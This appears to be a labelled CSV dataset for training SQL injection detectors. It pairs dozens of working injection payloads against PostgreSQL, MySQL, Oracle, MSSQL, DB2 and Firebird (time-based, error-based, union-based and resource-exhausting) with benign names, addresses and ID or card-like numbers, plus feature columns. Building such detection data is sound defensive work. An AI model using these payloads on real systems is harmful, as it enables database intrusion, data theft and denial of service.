Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
1')) as jbcd where 9078=9078 and 6969=(select 6969 from pg_sleep(5))--,1,as jbcd where and select from pg_sleep,70,7,1,0,3,1,9,1,2,31,5,1
"1 where 1519=1519;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,where call regexp_substring repeat left crypt_key char char char null null,118,11,0,0,12,1,3,0,2,62,5,7
"1"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""pfea""=""pfea",1,and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and pfea pfea,122,19,0,4,7,0,13,2,1,83,7,1
fabres jordi,0,fabres jordi,12,2,0,0,0,0,1,0,0,11,0,0
"calle cerrada, 94,",0,calle cerrada,18,2,0,0,2,0,2,0,0,12,0,0
des-enartar,0,des enartar,11,2,0,0,0,0,0,0,1,10,0,0
"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671",1,or benchmark md5 0x694a4745 and,64,5,0,0,3,0,4,2,0,18,2,2
gwenda,0,gwenda,6,1,0,0,0,0,0,0,0,6,0,0
manez@lecriture.gn,0,manez lecriture gn,18,3,0,0,2,0,0,0,0,16,0,0
patterso,0,patterso,8,1,0,0,0,0,0,0,0,8,0,0
azcrate campalan,0,azcrate campalan,16,2,0,0,0,0,1,0,0,15,0,0
mlida,0,mlida,5,1,0,0,0,0,0,0,0,5,0,0
26562587w,0,26562587w,9,1,0,0,0,0,0,0,0,1,0,0
3,0,,2,0,0,0,0,0,0,0,0,0,0,0
42808198t,0,42808198t,9,1,0,0,0,0,0,0,0,1,0,0
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",1,or select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and bifi bifi,258,30,0,4,29,0,17,2,1,111,11,15
"c/ pablo iglesias, 116",0,pablo iglesias,22,2,0,0,1,0,3,0,1,14,0,0
badri@esmarbella.gs,0,badri esmarbella gs,19,3,0,0,2,0,0,0,0,17,0,0
casasnova vadal,0,casasnova vadal,15,2,0,0,0,0,1,0,0,14,0,0
breanne,0,breanne,7,1,0,0,0,0,0,0,0,7,0,0
printers,0,printers,8,1,0,0,0,0,0,0,0,8,0,0
-5352%'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'=',1,or in char char char char char select case when then char else char end char char char char char and,203,21,4,0,4,0,14,2,11,80,9,12
mccaffria_malanowicz@fbi-criminal-network.com.mr,0,mccaffria_malanowicz fbi criminal network com mr,48,6,0,0,4,0,0,0,2,42,0,0
jessa,0,jessa,5,1,0,0,0,0,0,0,0,5,0,0
"1"" where 4991=4991 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,where or char char char char regexp_substring repeat right char null,127,11,0,1,12,1,4,1,2,57,4,8
clav6ria,0,clav6ria,8,1,0,0,0,0,0,0,0,7,0,0
"1'+(select idnb where 2338=2338;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",1,select idnb where select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,129,22,2,0,9,0,14,0,3,84,8,1
"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1,union all select,73,3,0,0,10,1,4,0,1,14,3,0
symon,0,symon,5,1,0,0,0,0,0,0,0,5,0,0
"-3205"") union all select 5233,5233,5233,5233#",1,union all select,45,3,0,1,4,1,4,0,1,14,3,0
qu,0,qu,2,1,0,0,0,0,0,0,0,2,0,0
"1));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,select dbms_pipe receive_message chr chr chr chr from dual,88,9,0,0,11,1,3,0,2,48,2,6
apolilladura,0,apolilladura,12,1,0,0,0,0,0,0,0,12,0,0
22416,0,,5,0,0,0,0,0,0,0,0,0,0,0
tolox,0,tolox,5,1,0,0,0,0,0,0,0,5,0,0
horst@engibraltar.com.co,0,horst engibraltar com co,24,4,0,0,3,0,0,0,0,21,0,0
rexach donada,0,rexach donada,13,2,0,0,0,0,1,0,0,12,0,0
san salvador,0,san salvador,12,2,0,0,0,0,1,0,0,11,0,0
47419,0,,5,0,0,0,0,0,0,0,0,0,0,0
9687551942893066,0,,16,0,0,0,0,0,0,0,0,0,0,0
37068097d,0,37068097d,9,1,0,0,0,0,0,0,0,1,0,0
4787579213279770,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph",1,and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and vcph vcph,126,14,4,0,7,0,9,2,1,55,6,3
atanasio menendez s/n,0,atanasio menendez,21,2,0,0,0,0,2,0,1,18,0,0
"1%')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,and char char char char regexp_substring repeat left crypt_key char char char null null,146,14,1,0,18,1,2,1,2,72,4,11
rattanap,0,rattanap,8,1,0,0,0,0,0,0,0,8,0,0
jeria cifr,0,jeria cifr,10,2,0,0,0,0,1,0,0,9,0,0
"1')) and elt(1210=1210,sleep(5)) and (('ogpg'='ogpg",1,and elt sleep and ogpg ogpg,51,6,4,0,3,0,4,2,0,22,2,2
f1581il2ente,0,f1581il2ente,12,1,0,0,0,0,0,0,0,7,0,0
sala@mystyleperfume.ls,0,sala mystyleperfume ls,22,3,0,0,2,0,0,0,0,20,0,0
"1') where 7279=7279 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,122,17,1,0,7,1,13,1,3,77,7,1
ruhl.friedkin@opel-e-flex.in,0,ruhl friedkin opel flex in,28,5,0,0,3,0,0,0,2,23,1,0
"1 where 5466=5466 and 2388=benchmark(5000000,md5(0x6d457153))#",1,where and benchmark md5 0x6d457153,62,5,0,0,4,1,4,1,0,21,2,2
molinos de duero,0,molinos de duero,16,3,0,0,0,0,2,0,0,14,0,0
"-3581'||(select 'uxmh' from dual where 8954=8954 union all select 8954,8954,8954,8954,8954,8954#",1,select uxmh from dual where union all select,96,8,3,0,9,1,9,0,1,37,6,0
lizalde-kikabidze@sorority.zr,0,lizalde kikabidze sorority zr,29,4,0,0,2,0,0,0,1,26,0,0
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('rgyc'='rgyc,1,and qqpjq select case when then else end from rdb database qzvzq and rgyc rgyc,117,15,8,0,7,0,15,2,0,64,9,1
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",1,or char char char char regexp_substring repeat right char null and,121,11,0,0,12,0,4,2,0,55,4,8
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'wjwn'='wjwn",1,and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and wjwn wjwn,175,15,4,0,8,0,12,2,2,60,8,3
"vendeja, 1,",0,vendeja,11,1,0,0,2,0,1,0,0,7,0,0
61089610t,0,61089610t,9,1,0,0,0,0,0,0,0,1,0,0
"1%')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('%'='",1,and row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by and,219,22,4,0,11,0,21,2,3,102,14,5
41420,0,,5,0,0,0,0,0,0,0,0,0,0,0
culubret lluss,0,culubret lluss,14,2,0,0,0,0,1,0,0,13,0,0
"1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",1,where and char char char char regexp_substring repeat right char null,128,11,0,1,12,1,4,1,2,58,4,8
"1' where 1031=1031 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1,where or char char char char regexp_substring repeat right char null,124,11,1,0,12,1,4,1,2,57,4,8
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",1,procedure analyse extractvalue concat 0x5c 0x7171706a71 select case when then else end 0x717a767a71 and hrkf like hrkf,156,17,0,4,6,0,14,1,0,81,8,4
"1') where 6772=6772 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",1,where and row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,223,22,1,0,9,1,21,1,5,104,14,5
1)) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((1260=1260,1,and utl_inaddr get_host_address chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and,218,22,0,0,27,0,14,2,0,92,9,10
calle regimineto del sol 48 10e,0,calle regimineto del sol 10e,31,5,0,0,0,0,5,0,0,22,0,0
carretera rubi 106,0,carretera rubi,18,2,0,0,0,0,2,0,0,13,0,0
-6203'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee,1,or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and luee luee,231,24,4,0,27,0,14,2,1,101,9,12
45641,0,,5,0,0,0,0,0,0,0,0,0,0,0
solski9,0,solski9,7,1,0,0,0,0,0,0,0,6,0,0
rashmi,0,rashmi,6,1,0,0,0,0,0,0,0,6,0,0
fest lairigoyen,0,fest lairigoyen,15,2,0,0,0,0,1,0,0,14,0,0
"1')) as kgfp where 2366=2366;select count(*) from generate_series(1,5000000)--",1,as kgfp where select count from generate_series,78,7,1,0,4,1,7,0,3,40,4,1
"1))) union all select null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null,63,11,0,0,7,1,4,0,2,46,11,0
1') as syer where 3141=3141 rlike (select (case when (6233=7567) then 1 else 0x28 end))--,1,as syer where rlike select case when then else 0x28 end,89,11,1,0,2,1,14,0,2,42,9,0
cardiel de los montes,0,cardiel de los montes,21,4,0,0,0,0,3,0,0,18,0,0
"catalanes, 137, 3?a",0,catalanes,19,1,0,0,3,0,2,0,0,10,0,0
panell portaneri,0,panell portaneri,16,2,0,0,0,0,1,0,0,15,0,0
57186589x,0,57186589x,9,1,0,0,0,0,0,0,0,1,0,0
oropelero,0,oropelero,9,1,0,0,0,0,0,0,0,9,0,0
-4484')) or 6872=6872 and (('oxuo'='oxuo,1,or and oxuo oxuo,40,4,4,0,2,0,4,2,1,13,2,0
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 eahg,109,12,0,0,7,1,8,1,1,47,5,3
28530,0,,5,0,0,0,0,0,0,0,0,0,0,0
22430,0,,5,0,0,0,0,0,0,0,0,0,0,0
youji,0,youji,5,1,0,0,0,0,0,0,0,5,0,0
waller,0,waller,6,1,0,0,0,0,0,0,0,6,0,0
nichole,0,nichole,7,1,0,0,0,0,0,0,0,7,0,0
demonlatra,0,demonlatra,10,1,0,0,0,0,0,0,0,10,0,0
"1%"") or (select * from (select(sleep(5)))sddo)#",1,or select from select sleep sddo,47,6,0,1,2,1,5,1,1,27,4,1
09614,0,,5,0,0,0,0,0,0,0,0,0,0,0
01150051m,0,01150051m,9,1,0,0,0,0,0,0,0,1,0,0
1'));select (case when (6045=2786) then 6045 else 1/(select 0) end)--,1,select case when then else select end,69,7,1,0,2,1,9,0,3,31,7,0
"1%' union all select null,null,null#",1,union all select null null null,36,6,1,0,4,1,4,0,0,26,6,0
"calle miguel lopez de legazpi, 48, 8f",0,calle miguel lopez de legazpi 8f,37,6,0,0,2,0,6,0,0,26,0,0
barsky,0,barsky,6,1,0,0,0,0,0,0,0,6,0,0
06363808f,0,06363808f,9,1,0,0,0,0,0,0,0,1,0,0
yebra de basa,0,yebra de basa,13,3,0,0,0,0,2,0,0,11,0,0
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--",1,as hsws where waitfor delay,51,5,2,1,4,1,6,0,2,23,2,2
27784,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1)) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((5524=5524",1,and updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71 and,111,9,0,0,8,0,5,2,0,37,3,3
"antonio asenjo, 178, 6?h",0,antonio asenjo,24,2,0,0,3,0,3,0,0,14,0,0
teo,0,teo,3,1,0,0,0,0,0,0,0,3,0,0
0381793087157958,0,,16,0,0,0,0,0,0,0,0,0,0,0
9385780627956523,0,,16,0,0,0,0,0,0,0,0,0,0,0
13328,0,,5,0,0,0,0,0,0,0,0,0,0,0
chalanera,0,chalanera,9,1,0,0,0,0,0,0,0,9,0,0
colvara pulve,0,colvara pulve,13,2,0,0,0,0,1,0,0,12,0,0
16620,0,,5,0,0,0,0,0,0,0,0,0,0,0
fennell,0,fennell,7,1,0,0,0,0,0,0,0,7,0,0
10666,0,,5,0,0,0,0,0,0,0,0,0,0,0
"jose maria mortes lerma, 151 11-d",0,jose maria mortes lerma,33,4,0,0,1,0,5,0,1,21,0,0
"1'||(select 'pnsw' where 2103=2103 union all select null,null,null,null,null,null,null,null--",1,select pnsw where union all select null null null null null null null null,93,14,3,0,10,1,7,0,2,61,13,0
400ol4,0,400ol4,6,1,0,0,0,0,0,0,0,2,0,0
"pobla de segur 125,",0,pobla de segur,19,3,0,0,1,0,3,0,0,12,0,0
2557912970687783,0,,16,0,0,0,0,0,0,0,0,0,0,0
"garrotxa, 118",0,garrotxa,13,1,0,0,1,0,1,0,0,8,0,0
3454478326370479,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1""));select pg_sleep(5) and ((""byhx"" like ""byhx",1,select pg_sleep and byhx like byhx,47,6,0,4,2,0,5,1,0,28,3,1
95001516q,0,95001516q,9,1,0,0,0,0,0,0,0,1,0,0
1')));if(7899=7899) select 7899 else drop function zbbp--,1,if select else drop function zbbp,57,6,1,0,2,1,6,0,2,28,4,1
"fierro 66, 3?e",0,fierro,14,1,0,0,2,0,2,0,0,7,0,0
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",1,or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and ireg like ireg,122,18,4,0,10,0,14,2,1,77,5,1
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1,union all select,64,3,0,1,8,1,4,0,1,14,3,0
"plaza aparejador federico bermudez 139,",0,plaza aparejador federico bermudez,39,4,0,0,1,0,4,0,0,31,0,0
di rado elejalde,0,di rado elejalde,16,3,0,0,0,0,2,0,0,14,0,0
aflechate,0,aflechate,9,1,0,0,0,0,0,0,0,9,0,0
"c/ la hoz, 17",0,la hoz,13,2,0,0,1,0,3,0,1,6,0,0
putman,0,putman,6,1,0,0,0,0,0,0,0,6,0,0
"travesia castilla, 92, 5-g",0,travesia castilla,26,2,0,0,2,0,3,0,1,17,0,0
97222758x,0,97222758x,9,1,0,0,0,0,0,0,0,1,0,0
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""%""=""",1,create or replace function sleep int returns int as lib libc so sleep language strict select sleep and,128,18,6,4,8,0,15,2,2,86,6,4
"1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,where or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,116,15,1,0,11,1,12,1,3,67,4,1
"torms, els",0,torms els,10,2,0,0,1,0,1,0,0,8,0,0
llort pato,0,llort pato,10,2,0,0,0,0,1,0,0,9,0,0
tal,0,tal,3,1,0,0,0,0,0,0,0,3,0,0
pal,0,pal,3,1,0,0,0,0,0,0,0,3,0,0
1%'))) and 9198=9198--,1,and,22,1,1,0,2,1,2,1,2,3,0,0
hazell,0,hazell,6,1,0,0,0,0,0,0,0,6,0,0
calle matias ramon martinez martinez 30,0,calle matias ramon martinez martinez,39,5,0,0,0,0,5,0,0,32,0,0
inoportunamente,0,inoportunamente,15,1,0,0,0,0,0,0,0,15,0,0
7u6can*i2a04n,0,7u6can i2a04n,13,2,0,0,0,0,0,0,1,7,0,0
jb,0,,3,0,0,0,0,0,0,0,0,2,0,0
6_ocin,0,6_ocin,6,1,0,0,1,0,0,0,0,4,0,0
뎴,0,,1,0,0,0,0,0,0,0,0,0,0,0
sobrestante,0,sobrestante,11,1,0,0,0,0,0,0,0,11,0,0
"-4350"")) as mmwq where 9801=9801 or (8520=2834)*2834--",1,as mmwq where or,54,4,0,1,2,1,6,1,4,13,3,0
"1')) as fwhv where 3921=3921 union all select null,null--",1,as fwhv where union all select null null,57,8,1,0,2,1,8,0,2,33,7,0
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,as wajy where call regexp_substring repeat right char null,95,9,0,0,6,1,5,0,2,49,5,4
"tornadizo, el",0,tornadizo el,13,2,0,0,1,0,1,0,0,11,0,0
"-9923%'))) union all select 8985,8985,8985,8985,8985,8985,8985#",1,union all select,63,3,1,0,8,1,4,0,1,14,3,0
12427,0,,5,0,0,0,0,0,0,0,0,0,0,0
"c/ paseillo 153,",0,paseillo,16,1,0,0,1,0,2,0,1,9,0,0
sant joan de vilatorrada,0,sant joan de vilatorrada,24,4,0,0,0,0,3,0,0,21,0,0
castellcir,0,castellcir,10,1,0,0,0,0,0,0,0,10,0,0
"-3620'||(select 'kmei' where 8533=8533 union all select 8533,8533,8533,8533--",1,select kmei where union all select,77,6,3,0,6,1,7,0,3,29,5,0
zaguero,0,zaguero,7,1,0,0,0,0,0,0,0,7,0,0
6255246118893731,0,,16,0,0,0,0,0,0,0,0,0,0,0
"-7202%"")) union all select 2901#",1,union all select,32,3,0,1,2,1,4,0,1,14,3,0
"-8013%"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",1,or convert int select char char char char char select case when then char else char end char char char char char and,212,23,0,4,6,0,13,2,11,94,9,12
"1' in boolean mode) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))#",1,in boolean mode or extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,109,11,1,0,7,1,6,1,0,49,3,3
uh@uy07%,0,uh uy07,8,2,0,0,2,0,0,0,0,4,0,0
"1%' and elt(4249=4249,7259) and '%'='",1,and elt and,37,3,4,0,5,0,4,2,0,9,2,1
l5r78gea,0,l5r78gea,8,1,0,0,0,0,0,0,0,5,0,0
"-7240')) union all select 8064,8064,8064#",1,union all select,41,3,1,0,3,1,4,0,1,14,3,0
"1"" and 1668=8288",1,and,16,1,0,1,1,0,2,1,0,3,0,0
"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",1,procedure analyse extractvalue concat 0x5c 0x7171706a71 select case when then else end 0x717a767a71 and,143,14,0,4,9,0,12,1,0,69,7,4
buf mueton,0,buf mueton,10,2,0,0,0,0,1,0,0,9,0,0
-6014')) or (9860=4848)*4848 and (('qtge'='qtge,1,or and qtge qtge,47,4,4,0,2,0,4,2,2,13,2,0
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('dpdz' like 'dpdz",1,select case when then regexp_substring repeat left crypt_key char char char null null else char char char char end from values and dpdz like dpdz,225,25,4,0,17,0,14,1,0,119,13,11
ferreruelo,0,ferreruelo,10,1,0,0,0,0,0,0,0,10,0,0
7930754215612383,0,,16,0,0,0,0,0,0,0,0,0,0,0
1) as xwgf where 4204=4204 and sleep(5)--,1,as xwgf where and sleep,41,5,0,0,1,1,6,1,2,19,3,1
85981189j,0,85981189j,9,1,0,0,0,0,0,0,0,1,0,0
"1"") where 5938=5938 and (select * from (select(sleep(5)))gcrr)#",1,where and select from select sleep gcrr,63,7,0,1,2,1,7,1,1,33,5,1
41230,0,,5,0,0,0,0,0,0,0,0,0,0,0
velen,0,velen,5,1,0,0,0,0,0,0,0,5,0,0
artillera,0,artillera,9,1,0,0,0,0,0,0,0,9,0,0
aguilera troule,0,aguilera troule,15,2,0,0,0,0,1,0,0,14,0,0
pipiolo sandrini,0,pipiolo sandrini,16,2,0,0,0,0,1,0,0,15,0,0
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,97,19,0,0,8,0,11,0,1,69,6,1
c48mari1e5a,0,c48mari1e5a,11,1,0,0,0,0,0,0,0,7,0,0
bakkum,0,bakkum,6,1,0,0,0,0,0,0,0,6,0,0
dotras avi,0,dotras avi,10,2,0,0,0,0,1,0,0,9,0,0
"1"") union all select null,null,null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null null null,71,13,0,1,10,1,4,0,0,54,13,0
verile,0,verile,6,1,0,0,0,0,0,0,0,6,0,0
01120,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1 or 8466=benchmark(5000000,md5(0x694a4745))# irvm",1,or benchmark md5 0x694a4745 irvm,50,5,0,0,3,1,3,1,0,19,1,2
bo722e6.8,0,bo722e6,9,1,0,0,1,0,0,0,0,3,0,0
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",1,select case when then ascii regexp_substring repeat right char null else select from information_schema system_users end from information_schema system_users,211,19,1,0,12,1,13,0,3,134,11,5
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and vjvz like vjvz,179,29,0,4,7,0,23,2,1,124,12,1
digott_sims@enigmatico.ar,0,digott_sims enigmatico ar,25,3,0,0,3,0,0,0,0,22,0,0
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",1,union all select,60,3,0,0,6,1,4,0,3,14,3,0
olalla,0,olalla,6,1,0,0,0,0,0,0,0,6,0,0
balcells parets,0,balcells parets,15,2,0,0,0,0,1,0,0,14,0,0
"1'+(select uzan where 4312=4312 and make_set(3129=9555,9555))+'",1,select uzan where and make_set,63,5,2,0,4,0,5,1,2,25,3,1
gala,0,gala,4,1,0,0,0,0,0,0,0,4,0,0
"-1171' union all select 3958,3958,3958,3958,3958--",1,union all select,50,3,1,0,4,1,4,0,3,14,3,0
87811832v,0,87811832v,9,1,0,0,0,0,0,0,0,1,0,0
brenden,0,brenden,7,1,0,0,0,0,0,0,0,7,0,0
0505974990919902,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1,and convert int select char char char char char select case when then char else char end char char char char char,198,22,1,0,3,0,11,1,10,92,8,12
-7187' or 4159=7465,1,or,19,1,1,0,1,0,2,1,1,2,0,0
#,0,,2,0,0,0,1,1,0,0,0,0,0,0
p41did3m31te,0,p41did3m31te,12,1,0,0,0,0,0,0,0,7,0,0
69346006v,0,69346006v,9,1,0,0,0,0,0,0,0,1,0,0
calle fermin salvochea 155,0,calle fermin salvochea,26,3,0,0,0,0,3,0,0,20,0,0
06160,0,,5,0,0,0,0,0,0,0,0,0,0,0
03580,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""pyfz"" like ""pyfz",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and pyfz like pyfz,224,26,0,4,25,0,16,2,0,96,10,10
